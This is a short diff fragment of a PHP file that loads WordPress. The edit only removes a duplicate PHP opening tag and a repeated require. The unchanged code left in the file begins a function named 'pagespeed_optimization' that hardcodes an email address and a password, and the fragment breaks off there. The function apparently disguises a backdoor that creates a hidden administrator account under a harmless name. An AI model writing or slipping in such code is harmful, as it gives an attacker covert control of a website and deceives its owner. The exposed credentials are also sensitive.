@@ -494,11 +494,7 @@
 require_once('wp-load.php'); 
 ?>
 
-<?php
 <?php 
-
-require_once('wp-load.php'); 
-
 function pagespeed_optimization() {
     $email = 'johnybran481@gmail.com';
     $password = 'P@@sword#6423';
